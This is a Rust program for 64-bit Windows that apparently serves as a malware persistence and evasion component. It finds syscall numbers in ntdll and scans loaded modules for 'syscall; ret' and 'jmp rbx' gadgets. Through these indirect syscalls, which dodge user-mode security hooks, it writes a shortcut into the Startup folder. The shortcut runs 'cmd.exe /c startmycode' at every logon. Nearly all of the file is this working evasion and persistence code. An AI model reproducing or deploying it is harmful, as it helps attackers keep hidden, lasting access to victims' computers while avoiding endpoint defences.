#![allow(non_snake_case)]
#![allow(non_camel_case_types)]
#![allow(non_upper_case_globals)]

#[cfg(not(target_arch = "x86_64"))]
compile_error!("This project only supports x86_64 architecture.");

mod syscalls;

use std::ptr::null_mut;
use std::ffi::c_void;
use windows_sys::Win32::Foundation::{HANDLE, NTSTATUS, UNICODE_STRING, GENERIC_WRITE, S_OK};
use windows_sys::Win32::Storage::FileSystem::{FILE_ATTRIBUTE_NORMAL};
use windows_sys::Win32::System::Com::{
    CoInitializeEx, CoCreateInstance, CLSCTX_ALL, COINIT_MULTITHREADED,
    IStream, CoTaskMemFree,
};
use windows_sys::Win32::System::Memory::{GlobalLock, GlobalUnlock};
use windows_sys::Win32::UI::Shell::{SHGetKnownFolderPath, KF_FLAG_CREATE};
use windows_sys::core::GUID;

const FOLDERID_Startup: GUID = GUID {
    data1: 0xB97D20BB,
    data2: 0xF46A,
    data3: 0x4C97,
    data4: [0xBA, 0x10, 0x5E, 0x36, 0x08, 0x43, 0x08, 0x54],
};

const CLSID_ShellLink: GUID = GUID {
    data1: 0x72024E10,
    data2: 0xE33D,
    data3: 0x11CF,
    data4: [0x8F, 0x1C, 0x00, 0x80, 0xC7, 0x44, 0x13, 0x78],
};

#[repr(C)]
struct STATSTG {
    pwcsName: *mut u16,
    r#type: u32,
    cbSize: u64,
    mtime: u64,
    atime: u64,
    ctime: u64,
    grfMode: u32,
    grfLocksSupported: u32,
    clsid: GUID,
    grfState: u32,
    reserved: u32,
}

#[link(name = "ole32")]
extern "system" {
    fn CreateStreamOnHGlobal(hglobal: *mut c_void, fdeleteonrelease: i32, ppstm: *mut *mut IStream) -> i32;
    fn GetHGlobalFromStream(pstm: *mut IStream, phglobal: *mut *mut c_void) -> i32;
}

#[repr(C)]
struct IUnknownVtbl {
    QueryInterface: unsafe extern "system" fn(*mut c_void, *const GUID, *mut *mut c_void) -> i32,
    AddRef: unsafe extern "system" fn(*mut c_void) -> u32,
    Release: unsafe extern "system" fn(*mut c_void) -> u32,
}

#[repr(C)]
struct IShellLinkWVtbl {
    QueryInterface: unsafe extern "system" fn(*mut c_void, *const GUID, *mut *mut c_void) -> i32,
    AddRef: unsafe extern "system" fn(*mut c_void) -> u32,
    Release: unsafe extern "system" fn(*mut c_void) -> u32,
    GetPath: usize,
    GetIDList: usize,
    SetIDList: usize,
    GetDescription: usize,
    SetDescription: unsafe extern "system" fn(*mut c_void, *const u16) -> i32,
    GetWorkingDirectory: usize,
    SetWorkingDirectory: unsafe extern "system" fn(*mut c_void, *const u16) -> i32,
    GetArguments: usize,
    SetArguments: unsafe extern "system" fn(*mut c_void, *const u16) -> i32,
    GetHotkey: usize,
    SetHotkey: usize,
    GetShowCmd: usize,
    SetShowCmd: usize,
    GetIconLocation: usize,
    SetIconLocation: usize,
    GetRelativePath: usize,
    SetRelativePath: usize,
    SetPath: unsafe extern "system" fn(*mut c_void, *const u16) -> i32,
}

#[repr(C)]
struct IPersistStreamVtbl {
    QueryInterface: unsafe extern "system" fn(*mut c_void, *const GUID, *mut *mut c_void) -> i32,
    AddRef: unsafe extern "system" fn(*mut c_void) -> u32,
    Release: unsafe extern "system" fn(*mut c_void) -> u32,
    GetClassID: usize,
    IsDirty: usize,
    Load: usize,
    Save: unsafe extern "system" fn(*mut c_void, *mut IStream, i32) -> i32,
    GetSizeMax: usize,
}

#[repr(C)]
struct IStreamVtbl {
    QueryInterface: unsafe extern "system" fn(*mut c_void, *const GUID, *mut *mut c_void) -> i32,
    AddRef: unsafe extern "system" fn(*mut c_void) -> u32,
    Release: unsafe extern "system" fn(*mut c_void) -> u32,
    Read: usize,
    Write: usize,
    Seek: usize,
    SetSize: usize,
    CopyTo: usize,
    Commit: usize,
    Revert: usize,
    LockRegion: usize,
    UnlockRegion: usize,
    Stat: unsafe extern "system" fn(*mut c_void, *mut STATSTG, u32) -> i32,
    Clone: usize,
}

const IID_IPersistStream: GUID = GUID {
    data1: 0x00000109,
    data2: 0x0000,
    data3: 0x0000,
    data4: [0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46],
};

const IID_IShellLinkW: GUID = GUID {
    data1: 0x000214F9,
    data2: 0x0000,
    data3: 0x0000,
    data4: [0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46],
};

#[repr(C)]
pub struct OBJECT_ATTRIBUTES {
    pub Length: u32,
    pub RootDirectory: HANDLE,
    pub ObjectName: *const UNICODE_STRING,
    pub Attributes: u32,
    pub SecurityDescriptor: *mut c_void,
    pub SecurityQualityOfService: *mut c_void,
}

#[repr(C)]
pub struct IO_STATUS_BLOCK {
    pub Status: NTSTATUS,
    pub Information: usize,
}

const OBJ_CASE_INSENSITIVE: u32 = 0x00000040;
const FILE_OVERWRITE_IF: u32 = 0x00000005;
const FILE_NON_DIRECTORY_FILE: u32 = 0x00000040;
const FILE_SYNCHRONOUS_IO_NONALERT: u32 = 0x00000020;
const SYNCHRONIZE: u32 = 0x00100000;

fn create_unicode_string(buffer: &[u16]) -> UNICODE_STRING {
    let len = (buffer.len() - 1) * 2;
    UNICODE_STRING {
        Length: len as u16,
        MaximumLength: (len + 2) as u16,
        Buffer: buffer.as_ptr() as *mut u16,
    }
}

fn main() {
    unsafe {
        // Initialize COM early
        CoInitializeEx(null_mut(), COINIT_MULTITHREADED as u32);

        let ntdll_name = ['n' as u16, 't' as u16, 'd' as u16, 'l' as u16, 'l' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16];
        let ntdll_base = syscalls::get_module_base(&ntdll_name);
        if ntdll_base.is_null() { return; }

        let nt_create_file_ssn = syscalls::get_ssn(ntdll_base as *const u8, "NtCreateFile").expect("Failed to get NtCreateFile SSN");
        let nt_write_file_ssn = syscalls::get_ssn(ntdll_base as *const u8, "NtWriteFile").expect("Failed to get NtWriteFile SSN");
        let nt_close_ssn = syscalls::get_ssn(ntdll_base as *const u8, "NtClose").expect("Failed to get NtClose SSN");

        let mut syscall_gadget: *mut c_void = null_mut();
        let mut jmp_rbx_gadget: *mut c_void = null_mut();

        syscalls::for_each_module(|base, _name| {
            if syscall_gadget.is_null() {
                if let Some(g) = syscalls::find_gadget(base as *const u8, &[&[0x0F, 0x05, 0xC3]]) {
                    syscall_gadget = g as *mut c_void;
                }
            }
            if jmp_rbx_gadget.is_null() {
                if let Some(g) = syscalls::find_gadget(base as *const u8, &[&[0xFF, 0xE3], &[0x53, 0xC3]]) {
                    jmp_rbx_gadget = g as *mut c_void;
                }
            }
            !syscall_gadget.is_null() && !jmp_rbx_gadget.is_null()
        });

        if syscall_gadget.is_null() || jmp_rbx_gadget.is_null() { return; }

        let mut path_ptr: *mut u16 = null_mut();
        // Use KF_FLAG_CREATE to ensure folder exists
        if SHGetKnownFolderPath(&FOLDERID_Startup, KF_FLAG_CREATE as u32, 0, &mut path_ptr) != S_OK {
            return;
        }

        let mut i = 0;
        while *path_ptr.add(i) != 0 { i += 1; }
        let path_slice = std::slice::from_raw_parts(path_ptr, i);

        let mut full_path_wide = Vec::new();
        full_path_wide.extend("\\??\\".encode_utf16());
        full_path_wide.extend_from_slice(path_slice);
        if !full_path_wide.is_empty() && full_path_wide[full_path_wide.len()-1] != '\\' as u16 {
            full_path_wide.push('\\' as u16);
        }
        full_path_wide.extend("startmycode.lnk".encode_utf16());
        full_path_wide.push(0);

        let unicode_startup = create_unicode_string(&full_path_wide);

        let mut shell_link_ptr: *mut c_void = null_mut();
        if CoCreateInstance(&CLSID_ShellLink, null_mut(), CLSCTX_ALL, &IID_IShellLinkW, &mut shell_link_ptr) == S_OK {
            let shell_link_vtbl = *(shell_link_ptr as *mut *mut IShellLinkWVtbl);

            let target_path = "C:\\Windows\\System32\\cmd.exe".encode_utf16().chain(std::iter::once(0)).collect::<Vec<u16>>();
            let args = "/c startmycode".encode_utf16().chain(std::iter::once(0)).collect::<Vec<u16>>();
            let desc = "Start My Code".encode_utf16().chain(std::iter::once(0)).collect::<Vec<u16>>();
            let work_dir = "C:\\Windows\\System32".encode_utf16().chain(std::iter::once(0)).collect::<Vec<u16>>();

            ((*shell_link_vtbl).SetPath)(shell_link_ptr, target_path.as_ptr());
            ((*shell_link_vtbl).SetArguments)(shell_link_ptr, args.as_ptr());
            ((*shell_link_vtbl).SetDescription)(shell_link_ptr, desc.as_ptr());
            ((*shell_link_vtbl).SetWorkingDirectory)(shell_link_ptr, work_dir.as_ptr());

            let mut persist_stream_ptr: *mut c_void = null_mut();
            if ((*shell_link_vtbl).QueryInterface)(shell_link_ptr, &IID_IPersistStream, &mut persist_stream_ptr) == S_OK {
                let persist_stream_vtbl = *(persist_stream_ptr as *mut *mut IPersistStreamVtbl);
                let mut stream: *mut IStream = null_mut();
                if CreateStreamOnHGlobal(null_mut(), 1, &mut stream) == S_OK {
                    if ((*persist_stream_vtbl).Save)(persist_stream_ptr, stream, 1) == S_OK {
                        let stream_vtbl = *(stream as *mut *mut IStreamVtbl);
                        let mut stat = std::mem::zeroed::<STATSTG>();
                        if ((*stream_vtbl).Stat)(stream as *mut _, &mut stat, 1) == S_OK {
                            let mut hglobal: *mut c_void = null_mut();
                            GetHGlobalFromStream(stream, &mut hglobal);
                            let data_ptr = GlobalLock(hglobal);
                            if !data_ptr.is_null() {
                                let mut out_handle: HANDLE = 0;
                                let mut io_status = IO_STATUS_BLOCK { Status: 0, Information: 0 };
                                let mut obj_attr = OBJECT_ATTRIBUTES {
                                    Length: std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32,
                                    RootDirectory: 0,
                                    ObjectName: &unicode_startup,
                                    Attributes: OBJ_CASE_INSENSITIVE,
                                    SecurityDescriptor: null_mut(),
                                    SecurityQualityOfService: null_mut(),
                                };

                                let status = crate::syscall!(
                                    nt_create_file_ssn,
                                    syscall_gadget as *const u8,
                                    jmp_rbx_gadget as *const u8,
                                    &mut out_handle as *mut _ as usize,
                                    (GENERIC_WRITE | SYNCHRONIZE) as usize,
                                    &mut obj_attr as *mut _ as usize,
                                    &mut io_status as *mut _ as usize,
                                    0,
                                    FILE_ATTRIBUTE_NORMAL as usize,
                                    0,
                                    FILE_OVERWRITE_IF as usize,
                                    (FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT) as usize,
                                    0,
                                    0
                                );

                                if status == 0 {
                                    let mut write_io_status = IO_STATUS_BLOCK { Status: 0, Information: 0 };
                                    let mut byte_offset: i64 = 0;
                                    crate::syscall!(
                                        nt_write_file_ssn,
                                        syscall_gadget as *const u8,
                                        jmp_rbx_gadget as *const u8,
                                        out_handle as usize,
                                        0,
                                        0,
                                        0,
                                        &mut write_io_status as *mut _ as usize,
                                        data_ptr as usize,
                                        stat.cbSize as u32,
                                        &mut byte_offset as *mut _ as usize,
                                        0
                                    );
                                    crate::syscall!(nt_close_ssn, syscall_gadget as *const u8, jmp_rbx_gadget as *const u8, out_handle as usize);
                                }
                                GlobalUnlock(hglobal);
                            }
                        }
                    }
                    let stream_unknown_vtbl = *(stream as *mut *mut IUnknownVtbl);
                    ((*stream_unknown_vtbl).Release)(stream as *mut _);
                }
                let persist_unknown_vtbl = *(persist_stream_ptr as *mut *mut IUnknownVtbl);
                ((*persist_unknown_vtbl).Release)(persist_stream_ptr);
            }
            let shell_unknown_vtbl = *(shell_link_ptr as *mut *mut IUnknownVtbl);
            ((*shell_unknown_vtbl).Release)(shell_link_ptr);
        }
        CoTaskMemFree(path_ptr as *const _);
    }
}
